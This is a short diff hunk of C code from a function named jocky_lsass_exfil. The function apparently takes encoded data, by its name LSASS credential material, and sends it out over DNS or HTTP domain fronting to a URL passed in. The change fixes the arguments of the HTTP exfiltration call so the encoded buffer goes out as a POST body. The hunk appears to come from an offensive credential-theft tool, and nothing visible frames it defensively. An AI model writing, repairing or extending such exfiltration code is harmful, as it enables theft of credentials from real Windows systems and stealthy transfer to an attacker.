@@ -273,7 +273,7 @@ bool jocky_lsass_exfil(const char *exfil_url, const char *exfil_type)
         ok = jocky_exfil_dns(exfil_url, (int8_t*)enc, (int32_t)enc_sz);
 
     } else if (strcmp(exfil_type, "http") == 0) {
-        ok = jocky_exfil_front(exfil_url, exfil_url, "/", enc, enc_sz);
+        ok = jocky_exfil_front(exfil_url, NULL, (const char*)enc, "POST", (int32_t)enc_sz);
     }
 
     jocky_free(enc);
